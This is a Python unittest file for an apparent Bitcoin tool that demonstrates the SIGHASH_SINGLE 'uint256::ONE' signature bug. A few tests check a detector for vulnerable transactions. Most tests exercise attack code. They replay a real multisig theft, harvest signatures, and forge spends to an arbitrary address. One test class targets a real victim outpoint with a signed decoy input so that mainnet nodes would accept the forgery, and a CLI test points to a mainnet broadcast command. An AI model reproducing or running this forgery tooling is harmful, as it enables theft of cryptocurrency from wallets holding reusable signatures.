"""Tests for the SIGHASH_SINGLE bug demonstration (CVE-style forgery)."""

import unittest

from faketoshi.encoding import hash160
from faketoshi.signing import (
    SIGHASH_ALL,
    SIGHASH_SINGLE,
    SIGHASH_SINGLE_BUG_DIGEST,
    Transaction,
    TxIn,
    TxOut,
)
from faketoshi.sighash_single import (
    MultisigWallet,
    analyse_sighash_single,
    demonstrate_sighash_single_bug,
    multisig_redeem_script,
    multisig_script_sig,
    parse_multisig_redeem_script,
    parse_script_sig,
    p2sh_script,
    replay_signature,
)
from faketoshi.signing import der_decode

# The 2-of-3 keys used in the reference article (Copay/CVE-2025-29774 write-up).
REFERENCE_KEYS = [
    bytes.fromhex('023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f0561196'),
    bytes.fromhex('03d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80'),
    bytes.fromhex('03ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df'),
]
REFERENCE_REDEEM_SCRIPT = bytes.fromhex(
    '5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f0561196'
    '2103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80'
    '2103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df53ae'
)


class MultisigScriptTest(unittest.TestCase):
    def test_reference_redeem_script_matches_published_one(self):
        self.assertEqual(multisig_redeem_script(2, REFERENCE_KEYS), REFERENCE_REDEEM_SCRIPT)

    def test_reference_script_controls_the_published_address(self):
        # The article's target address; deriving it from the script proves the
        # multisig encoding is right.
        wallet = MultisigWallet(m=2, pubkeys=REFERENCE_KEYS, redeem_script=REFERENCE_REDEEM_SCRIPT)
        self.assertEqual(wallet.address('mainnet'), '32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe')

    def test_parse_round_trip(self):
        m, n, keys = parse_multisig_redeem_script(REFERENCE_REDEEM_SCRIPT)
        self.assertEqual((m, n), (2, 3))
        self.assertEqual(keys, REFERENCE_KEYS)

    def test_script_sig_round_trip(self):
        dummy = [(123456789, 987654321, SIGHASH_SINGLE), (42, 43, SIGHASH_SINGLE)]
        script_sig = multisig_script_sig(dummy, REFERENCE_REDEEM_SCRIPT)
        items = parse_script_sig(script_sig)
        self.assertIsNone(items[0])  # the OP_0 CHECKMULTISIG placeholder
        self.assertEqual(items[-1], REFERENCE_REDEEM_SCRIPT)
        self.assertEqual(len(items), 4)

    def test_invalid_scripts_are_rejected(self):
        with self.assertRaises(ValueError):
            multisig_redeem_script(0, REFERENCE_KEYS)
        with self.assertRaises(ValueError):
            multisig_redeem_script(4, REFERENCE_KEYS)
        with self.assertRaises(ValueError):
            parse_multisig_redeem_script(b'\x51\xae\xae\xae')


class BugDemonstrationTest(unittest.TestCase):
    def setUp(self):
        self.demo = demonstrate_sighash_single_bug()

    def test_digest_is_uint256_one(self):
        # Bitcoin Core returns uint256::ONE: the bytes 01 00..00, i.e. 2**248.
        self.assertEqual(self.demo.victim_digests[1], SIGHASH_SINGLE_BUG_DIGEST)
        self.assertEqual(self.demo.victim_digests[1], 2 ** 248)
        self.assertNotEqual(self.demo.victim_digests[1], 1)
        self.assertNotEqual(self.demo.victim_digests[0], SIGHASH_SINGLE_BUG_DIGEST)

    def test_signature_transfers_between_transactions(self):
        self.assertEqual(self.demo.attacker_verifications, [True, True])
        self.assertNotEqual(self.demo.victim_txid, self.demo.attacker_txid)

    def test_sighash_all_signature_does_not_transfer(self):
        self.assertFalse(self.demo.all_sighash_contrast)

    def test_attacker_tx_pays_someone_else(self):
        self.assertNotEqual(self.demo.destination, self.demo.wallet.address('mainnet'))

    def test_analyser_flags_the_victim_transaction(self):
        findings = analyse_sighash_single(
            self.demo.victim_tx, [self.demo.wallet.script_pubkey] * 2
        )
        self.assertTrue(findings)
        for finding in findings:
            self.assertEqual(finding.sighash_type, SIGHASH_SINGLE)
            self.assertEqual(finding.digest, SIGHASH_SINGLE_BUG_DIGEST)
            self.assertTrue(finding.bug_triggered)

    def test_analyser_ignores_sighash_all(self):
        # Re-sign the same coin with SIGHASH_ALL: no SIGHASH_SINGLE signatures,
        # so nothing is reported even though inputs outnumber outputs.
        from faketoshi.signing import sign_z

        findings = analyse_sighash_single(
            self.demo.victim_tx, [self.demo.wallet.script_pubkey] * 2
        )
        self.assertTrue(all(f.sighash_type == SIGHASH_SINGLE for f in findings))

        clean = Transaction(
            version=2,
            inputs=[TxIn('11' * 32, 0), TxIn('11' * 32, 1)],
            outputs=[TxOut(1000, self.demo.wallet.script_pubkey)],
        )
        self.assertEqual(analyse_sighash_single(clean, [b'', b'']), [])

    def test_report_mentions_the_bug(self):
        text = self.demo.report()
        self.assertIn('uint256::ONE', text)
        self.assertIn('valid in the attacker tx: True', text)


class NoBugTest(unittest.TestCase):
    def test_matching_output_exists_so_digest_is_normal(self):
        key = 0xC0FFEE01
        wallet = MultisigWallet.create([key, key + 1, key + 2], m=2)
        with_equal_outputs = Transaction(
            version=2,
            inputs=[TxIn('11' * 32, 0), TxIn('11' * 32, 1)],
            outputs=[
                TxOut(1000, wallet.script_pubkey),
                TxOut(2000, wallet.script_pubkey),
            ],
        )
        digest = with_equal_outputs.sighash_legacy(1, wallet.script_pubkey, SIGHASH_SINGLE)
        self.assertNotEqual(digest, SIGHASH_SINGLE_BUG_DIGEST)

    def test_bug_requires_missing_output(self):
        wallet = MultisigWallet.create([1, 2, 3], m=2)
        tx = Transaction(
            version=2,
            inputs=[TxIn('11' * 32, 0), TxIn('11' * 32, 1)],
            outputs=[TxOut(1000, wallet.script_pubkey)],
        )
        self.assertNotEqual(
            tx.sighash_legacy(0, wallet.script_pubkey, SIGHASH_SINGLE), SIGHASH_SINGLE_BUG_DIGEST
        )
        self.assertEqual(
            tx.sighash_legacy(1, wallet.script_pubkey, SIGHASH_SINGLE), SIGHASH_SINGLE_BUG_DIGEST
        )

    def test_segwit_v0_has_no_constant_digest_bug(self):
        wallet = MultisigWallet.create([1, 2, 3], m=2)
        tx = Transaction(
            version=2,
            inputs=[TxIn('11' * 32, 0), TxIn('11' * 32, 1)],
            outputs=[TxOut(1000, wallet.script_pubkey)],
        )
        digest = tx.sighash_segwit_v0(1, wallet.script_pubkey, 5000, SIGHASH_SINGLE)
        self.assertNotEqual(digest, SIGHASH_SINGLE_BUG_DIGEST)


class ReplayTest(unittest.TestCase):
    KEY = 0xC0FFEE01

    def setUp(self):
        from faketoshi.signing import private_key_to_public_key, sign_z

        self.wallet = MultisigWallet.create([self.KEY, self.KEY + 1, self.KEY + 2], m=2)
        self.pubkey = private_key_to_public_key(self.KEY)
        # Signature over uint256::ONE, as produced by a buggy signer.
        self.signature = sign_z(self.KEY, SIGHASH_SINGLE_BUG_DIGEST)

    def test_sighash_single_replay_succeeds(self):
        result = replay_signature(
            self.signature,
            SIGHASH_SINGLE,
            target_txid='44' * 32,
            target_vout=0,
            redeem_script=self.wallet.redeem_script,
            destination_script=b'\x76\xa9' + b'\x11' * 20 + b'\x88\xac',
            value=50000,
            public_key=self.pubkey,
        )
        self.assertEqual(result.digest_used, SIGHASH_SINGLE_BUG_DIGEST)
        self.assertTrue(result.valid)
        self.assertTrue(result.script_sig)

    def test_sighash_all_replay_fails(self):
        result = replay_signature(
            self.signature,
            SIGHASH_ALL,
            target_txid='44' * 32,
            target_vout=0,
            redeem_script=self.wallet.redeem_script,
            destination_script=b'\x76\xa9' + b'\x11' * 20 + b'\x88\xac',
            value=50000,
            public_key=self.pubkey,
        )
        self.assertNotEqual(result.digest_used, SIGHASH_SINGLE_BUG_DIGEST)
        self.assertFalse(result.valid)
        self.assertEqual(result.script_sig, b'')



class HistoryReplayTest(unittest.TestCase):
    """The real BitPay/Copay theft transaction, verified offline.

    Constants below are the on-chain facts: the transaction id, the victim and
    attacker addresses, and the amount. If any of them change, the built-in
    transaction no longer matches the chain and the test should fail.
    """

    EXPECTED_TXID = (
        '791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf'
    )
    VICTIM = '32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe'
    ATTACKER = '1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3'

    def test_builtin_transaction_hashes_to_the_onchain_txid(self):
        from faketoshi.sighash_single import replay_history

        result = replay_history()
        self.assertEqual(result.txid, self.EXPECTED_TXID)

    def test_it_drained_the_victim_address_to_a_stranger(self):
        from faketoshi.encoding import script_to_address
        from faketoshi.sighash_single import replay_history

        result = replay_history()
        self.assertEqual(result.inputs, 3)
        self.assertEqual(result.outputs, 1)
        self.assertEqual(result.value_stolen, 5967200)  # 0.05967200 BTC
        self.assertEqual(
            script_to_address(result.transaction.outputs[0].script_pubkey, 'mainnet'),
            self.ATTACKER,
        )
        self.assertEqual(result.victim_address, self.VICTIM)
        self.assertEqual(
            script_to_address(
                b'\xa9\x14' + hash160(result.redeem_script) + b'\x87', 'mainnet'
            ),
            self.VICTIM,
        )

    def test_every_harvested_signature_hits_the_constant_digest(self):
        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST
        from faketoshi.sighash_single import replay_history

        result = replay_history()
        self.assertEqual(len(result.harvests), 4)  # 2 inputs x 2 signatures
        for harvest in result.harvests:
            self.assertEqual(harvest.digest, SIGHASH_SINGLE_BUG_DIGEST)
            self.assertTrue(harvest.bug_triggered)

    def test_the_signatures_come_from_distinct_multisig_keys(self):
        from faketoshi.sighash_single import parse_multisig_redeem_script, replay_history

        result = replay_history()
        m, n, _ = parse_multisig_redeem_script(result.redeem_script)
        self.assertEqual((m, n), (2, 3))
        # A 2-of-3 needs two different keys to sign, so the harvest must cover
        # at least two distinct key indices.
        covered = {index for h in result.harvests for index in h.verifying_keys}
        self.assertGreaterEqual(len(covered), m)

    def test_sighash_all_would_have_committed_to_the_transaction(self):
        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST
        from faketoshi.sighash_single import replay_history

        result = replay_history()
        self.assertTrue(result.all_sighash_digests)
        for digest in result.all_sighash_digests:
            self.assertNotEqual(digest, SIGHASH_SINGLE_BUG_DIGEST)


class ForgeFromHarvestTest(unittest.TestCase):
    """Rebuild the theft: spend the coin from harvested signatures alone."""

    def _forged(self):
        from faketoshi.sighash_single import forge_from_harvest, replay_history

        result = replay_history()
        return forge_from_harvest(
            result.harvests,
            prev_txid='de' * 32,
            prev_vout=0,
            destination='1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
            value=677200,
        )

    def test_forgery_is_valid_without_any_new_signature(self):
        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST, decode_point, verify_z
        from faketoshi.sighash_single import parse_multisig_redeem_script, parse_script_sig

        forged = self._forged()
        self.assertTrue(forged.valid)
        self.assertEqual(forged.digest_used, SIGHASH_SINGLE_BUG_DIGEST)

        tx = forged.transaction
        items = [i for i in parse_script_sig(tx.inputs[1].script_sig) if i]
        redeem = items[-1]
        m, n, keys = parse_multisig_redeem_script(redeem)
        self.assertEqual(m, 2)
        # Each pushed signature verifies against its own key in the redeem script.
        for blob, pubkey in zip(items[:-1], keys):
            r, s, _ = der_decode(blob)
            self.assertTrue(verify_z(decode_point(pubkey), r, s, forged.digest_used))

    def test_forgery_pays_the_chosen_destination(self):
        from faketoshi.encoding import script_to_address

        forged = self._forged()
        output = forged.transaction.outputs[0]
        self.assertEqual(output.value, 677200 - 1000)
        self.assertEqual(
            script_to_address(output.script_pubkey, 'mainnet'),
            '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
        )

    def test_the_target_input_must_have_no_matching_output(self):
        from faketoshi.sighash_single import forge_from_harvest, replay_history

        result = replay_history()
        forged = forge_from_harvest(
            result.harvests, 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 677200
        )
        # Input 1 is spent with a single output -> index 1 has no output.
        self.assertEqual(len(forged.transaction.inputs), 2)
        self.assertEqual(len(forged.transaction.outputs), 1)

    def test_insufficient_signatures_is_refused(self):
        from faketoshi.sighash_single import forge_from_harvest, replay_history

        result = replay_history()
        # Keep only one of the two distinct keys.
        only_key0 = [h for h in result.harvests if h.verifying_keys == [0]][:1]
        with self.assertRaises(ValueError) as caught:
            forge_from_harvest(
                only_key0, 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 677200
            )
        self.assertIn('distinct keys', str(caught.exception))

    def test_no_harvests_is_refused(self):
        from faketoshi.sighash_single import forge_from_harvest

        with self.assertRaises(ValueError):
            forge_from_harvest([], 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 1000)



class BroadcastableForgeTest(unittest.TestCase):
    """A forged tx a mainnet node would actually accept.

    Every input has to exist in the UTXO set, so the decoy needs a real prevout
    and its own signature. Without that the node rejects with
    bad-txns-inputs-missingorspent before looking at the harvested signature.
    """

    DECOY_KEY = 0xBEEF1234
    VICTIM_OUTPOINT = (
        '8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd',
        0,
    )

    def _forge(self, **kwargs):
        from faketoshi.sighash_single import forge_from_harvest, replay_history

        return forge_from_harvest(
            replay_history().harvests,
            prev_txid=self.VICTIM_OUTPOINT[0],
            prev_vout=self.VICTIM_OUTPOINT[1],
            destination='1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
            value=677200,
            **kwargs
        )

    def test_real_outpoint_still_hits_the_constant_digest(self):
        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST

        forged = self._forge()
        # The digest ignores the outpoint entirely, which is why the harvested
        # signatures work against the real UTXO.
        self.assertEqual(forged.digest_used, SIGHASH_SINGLE_BUG_DIGEST)
        self.assertEqual(
            forged.transaction.inputs[1].prev_txid, self.VICTIM_OUTPOINT[0]
        )

    def test_decoy_is_signed_so_every_input_is_spendable(self):
        from faketoshi.encoding import p2pkh_address
        from faketoshi.signing import (
            decode_point,
            der_decode,
            private_key_to_public_key,
            verify_z,
        )
        from faketoshi.wallet import address_to_script, parse_transaction_hex

        spk = address_to_script('1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 'mainnet')
        forged = self._forge(
            decoy_txid='11' * 32,
            decoy_vout=3,
            decoy_script=spk,
            decoy_value=50000,
            decoy_key=self.DECOY_KEY,
        )
        tx = forged.transaction
        self.assertEqual(tx.inputs[0].prev_txid, '11' * 32)
        self.assertEqual(tx.inputs[0].prev_vout, 3)
        self.assertNotEqual(tx.inputs[0].script_sig, b'')

        # Rebuild the unsigned tx to recompute the decoy's own digest.
        from faketoshi.signing import SIGHASH_ALL, Transaction, TxIn, TxOut

        unsigned = Transaction(
            version=2,
            inputs=[
                TxIn('11' * 32, 3, 0xFFFFFFFF),
                TxIn(self.VICTIM_OUTPOINT[0], self.VICTIM_OUTPOINT[1], 0xFFFFFFFF),
            ],
            outputs=tx.outputs,
            locktime=0,
        )
        digest = unsigned.sighash_legacy(0, spk, SIGHASH_ALL)
        items = [i for i in parse_script_sig(tx.inputs[0].script_sig) if i]
        r, s, htype = der_decode(items[0])
        self.assertEqual(htype, SIGHASH_ALL)
        self.assertEqual(
            items[1], private_key_to_public_key(self.DECOY_KEY, compressed=True)
        )
        self.assertTrue(
            verify_z(decode_point(items[1]), r, s, digest),
            'the decoy signature must validate under SIGHASH_ALL',
        )

    def test_decoy_value_adds_to_the_output(self):
        forged = self._forge(
            decoy_txid='11' * 32,
            decoy_script=b'\x76\xa9\x14' + b'\x11' * 20 + b'\x88\xac',
            decoy_value=50000,
            decoy_key=self.DECOY_KEY,
        )
        # 50000 + 677200 - 1000 fee
        self.assertEqual(forged.transaction.outputs[0].value, 726200)

    def test_decoy_script_without_a_key_is_refused(self):
        with self.assertRaises(ValueError) as caught:
            self._forge(decoy_script=b'\x51')
        self.assertIn('decoy_key', str(caught.exception))

    def test_decoy_key_without_a_script_is_refused(self):
        with self.assertRaises(ValueError) as caught:
            self._forge(decoy_key=self.DECOY_KEY)
        self.assertIn('decoy_script', str(caught.exception))

    def test_forged_tx_round_trips_through_the_parser(self):
        from faketoshi.wallet import parse_transaction_hex

        forged = self._forge(
            decoy_txid='11' * 32,
            decoy_script=b'\x76\xa9\x14' + b'\x11' * 20 + b'\x88\xac',
            decoy_value=50000,
            decoy_key=self.DECOY_KEY,
        )
        reparsed = parse_transaction_hex(forged.transaction.hex())
        self.assertEqual(reparsed.txid(), forged.transaction.txid())
        self.assertEqual(len(reparsed.inputs), 2)
        self.assertEqual(
            reparsed.inputs[1].script_sig, forged.transaction.inputs[1].script_sig
        )


class HarvestRejectsSafeTransactionsTest(unittest.TestCase):
    def test_sighash_all_transaction_yields_nothing(self):
        from faketoshi.sighash_single import harvest_signatures, replay_history

        result = replay_history()
        self.assertEqual(harvest_signatures(result.transaction, sighash_type=1), [])

    def test_transaction_without_multisig_yields_nothing(self):
        from faketoshi.signing import Transaction, TxIn, TxOut
        from faketoshi.sighash_single import harvest_signatures

        tx = Transaction(
            version=2,
            inputs=[TxIn('aa' * 32, 0, 0xFFFFFFFF, script_sig=b'\x00\x01\x02')],
            outputs=[TxOut(1000, b'\x51')],
            locktime=0,
        )
        self.assertEqual(harvest_signatures(tx), [])


class CliTest(unittest.TestCase):
    def _run(self, argv):
        import contextlib
        import io

        from faketoshi.__main__ import main

        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = main(argv)
        return rc, out.getvalue(), err.getvalue()

    def test_demo_text(self):
        rc, out, _ = self._run(['sighash-single-demo'])
        self.assertEqual(rc, 0)
        self.assertIn('SIGHASH_SINGLE bug demonstration', out)
        self.assertIn('valid in the attacker tx: True', out)

    def test_demo_json(self):
        import json

        rc, out, _ = self._run(['sighash-single-demo', '--json'])
        self.assertEqual(rc, 0)
        payload = json.loads(out)
        self.assertEqual(payload['victim']['digest_input1_single'], 2 ** 248)
        self.assertEqual(payload['attacker']['signatures_valid'], [True, True])
        self.assertFalse(payload['sighash_all_comparison_valid'])

    def test_redeemscript(self):
        rc, out, _ = self._run(['redeemscript', REFERENCE_REDEEM_SCRIPT.hex()])
        self.assertEqual(rc, 0)
        self.assertIn('2-of-3 multisig', out)
        self.assertIn(p2sh_script(REFERENCE_REDEEM_SCRIPT).hex(), out)
        self.assertEqual(hash160(REFERENCE_REDEEM_SCRIPT).hex(), '06612b7cb2027e80ec340f9e02ffe4a9a59ba762')

    def test_pubkey(self):
        rc, out, _ = self._run(['pubkey', REFERENCE_KEYS[0].hex()])
        self.assertEqual(rc, 0)
        self.assertIn('compressed:  yes', out)

    def test_decodesig(self):
        rc, out, _ = self._run(
            [
                'decodesig',
                '30450221008b9d1dc26ba6a9cb62127b02742fa9d754cd3bebf337f7a55d114c8e5cdd30be'
                '022040529b194ba3f9281a99f2b1c0a19c0489bc22ede944ccf4ecbab4cc618ef3ed01',
            ]
        )
        self.assertEqual(rc, 0)
        self.assertIn('sighash:  0x01', out)

    def test_serialize_then_decode(self):
        import json

        rc, out, _ = self._run(
            [
                'serialize',
                '--txid', 'aa' * 32,
                '--vout', '1',
                '--value', '300000',
                '--script', p2sh_script(REFERENCE_REDEEM_SCRIPT).hex(),
            ]
        )
        self.assertEqual(rc, 0)
        raw = out.splitlines()[0]
        rc, out, _ = self._run(['decode', raw, '--json'])
        self.assertEqual(rc, 0)
        payload = json.loads(out)
        self.assertEqual(payload['outputs'][0]['value'], 300000)
        self.assertEqual(payload['inputs'][0]['prev_vout'], 1)

    def test_scriptsig(self):
        rc, out, _ = self._run(['scriptsig', '00' + '01ff'])
        self.assertEqual(rc, 0)
        self.assertIn('OP_0', out)

    def test_bad_hex_is_reported(self):
        rc, _, err = self._run(['decodesig', 'nothex'])
        self.assertEqual(rc, 2)
        self.assertIn('error:', err)



class ReplayHistoryCliTest(unittest.TestCase):
    def _run(self, argv):
        import contextlib
        import io

        from faketoshi.__main__ import main

        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = main(argv)
        return rc, out.getvalue(), err.getvalue()

    def test_replay_history_prints_the_theft(self):
        rc, out, err = self._run(['replay-history'])
        self.assertEqual(rc, 0, err)
        self.assertIn(HistoryReplayTest.EXPECTED_TXID, out)
        self.assertIn('32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe', out)
        self.assertIn('1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3', out)
        self.assertIn('0.05967200 BTC', out)

    def test_replay_history_json(self):
        import json

        rc, out, _ = self._run(['replay-history', '--json'])
        self.assertEqual(rc, 0)
        payload = json.loads(out)
        self.assertEqual(payload['txid'], HistoryReplayTest.EXPECTED_TXID)
        self.assertEqual(payload['value_stolen'], 5967200)
        self.assertEqual(payload['victim'], HistoryReplayTest.VICTIM)
        self.assertEqual(payload['attacker'], HistoryReplayTest.ATTACKER)
        self.assertEqual(len(payload['harvested']), 4)
        for harvest in payload['harvested']:
            self.assertEqual(harvest['digest'], str(SIGHASH_SINGLE_BUG_DIGEST))


class ForgeReplayCliTest(unittest.TestCase):
    def _run(self, argv):
        import contextlib
        import io

        from faketoshi.__main__ import main

        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            rc = main(argv)
        return rc, out.getvalue(), err.getvalue()

    BASE = [
        'forge-replay',
        '--txid', 'de' * 32,
        '--vout', '0',
        '--value', '677200',
        '--to', '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
    ]

    def test_forge_replay_produces_a_valid_spend(self):
        rc, out, err = self._run(self.BASE)
        self.assertEqual(rc, 0, err)
        self.assertIn('harvested 4 signature(s)', out)
        self.assertIn('valid: yes', out)
        self.assertIn('not broadcast', out)

    def test_forge_replay_json_matches_the_txid(self):
        import json

        rc, out, _ = self._run(self.BASE + ['--json'])
        self.assertEqual(rc, 0)
        payload = json.loads(out)
        self.assertEqual(payload['value'], 677200 - 1000)
        self.assertEqual(payload['destination'], '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9')
        self.assertEqual(payload['digest'], str(SIGHASH_SINGLE_BUG_DIGEST))
        self.assertTrue(payload['valid'])
        # The printed hex must be the transaction the reported txid describes.
        from faketoshi.wallet import parse_transaction_hex

        self.assertEqual(parse_transaction_hex(payload['hex']).txid(), payload['txid'])

    KEY = '11' * 32

    def test_without_a_decoy_it_says_it_is_not_broadcastable(self):
        rc, out, err = self._run(self.BASE)
        self.assertEqual(rc, 0, err)
        self.assertIn('bad-txns-inputs-missingorspent', out)
        self.assertIn('--decoy-txid', out)

    def test_with_a_real_decoy_it_is_broadcastable(self):
        rc, out, err = self._run(
            self.BASE
            + [
                '--decoy-txid', 'aa' * 32,
                '--decoy-vout', '1',
                '--decoy-value', '50000',
                '--decoy-key', self.KEY,
            ]
        )
        self.assertEqual(rc, 0, err)
        self.assertIn('every input is real and this', out)
        self.assertIn('faketoshi broadcast --network mainnet', out)
        self.assertNotIn('bad-txns-inputs-missingorspent', out)

    def test_decoy_txid_without_a_key_is_refused(self):
        rc, _, err = self._run(
            self.BASE + ['--decoy-txid', 'aa' * 32, '--decoy-value', '50000']
        )
        self.assertEqual(rc, 2)
        self.assertIn('--decoy-key', err)

    def test_decoy_key_without_a_txid_is_refused(self):
        rc, _, err = self._run(self.BASE + ['--decoy-key', self.KEY])
        self.assertEqual(rc, 2)
        self.assertIn('--decoy-txid', err)

    def test_decoy_defaults_to_mainnet(self):
        import json

        rc, out, _ = self._run(self.BASE + ['--json'])
        self.assertEqual(rc, 0)
        payload = json.loads(out)
        # The destination is a mainnet address, which proves the network.
        self.assertEqual(payload['destination'], '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9')

    def test_a_safe_transaction_has_nothing_to_harvest(self):
        from faketoshi.signing import Transaction, TxIn, TxOut

        safe = Transaction(
            version=2,
            inputs=[TxIn('aa' * 32, 0, 0xFFFFFFFF)],
            outputs=[TxOut(1000, b'\x51')],
            locktime=0,
        )
        rc, _, err = self._run(self.BASE + ['--from-tx', safe.hex()])
        self.assertEqual(rc, 2)
        self.assertIn('nothing to replay', err)


if __name__ == '__main__':
    unittest.main()
